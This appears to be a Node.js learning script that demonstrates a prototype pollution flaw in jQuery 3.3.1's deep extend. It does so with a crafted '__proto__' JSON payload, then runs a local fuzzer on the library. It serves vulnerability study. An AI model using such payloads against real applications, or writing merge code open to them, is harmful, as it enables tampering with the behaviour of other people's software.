const { JSDOM } = require("jsdom");
const { window } = new JSDOM("");
const jQuery = require("jquery")(window);

var object1 = { a: 1, b: 2 },
  object2 = { c: 3, d: 4 };
var object = jQuery.extend({}, object1, object2);
console.log(object);
let BAD_JSON = JSON.parse('{"__proto__": {"test": true}}');
var object3 = jQuery.extend(true, {}, BAD_JSON);
console.log("test" in {}); // true
console.log(object3);
console.log(jQuery().jquery);

let fuzzer = require("/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/exploit/prototype-pollution-nsec18/find-vuln/find-vuln.js");
var fuzz = fuzzer(
  "/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/npm_libraries/jquery/v3.3.1/node_modules/jquery"
);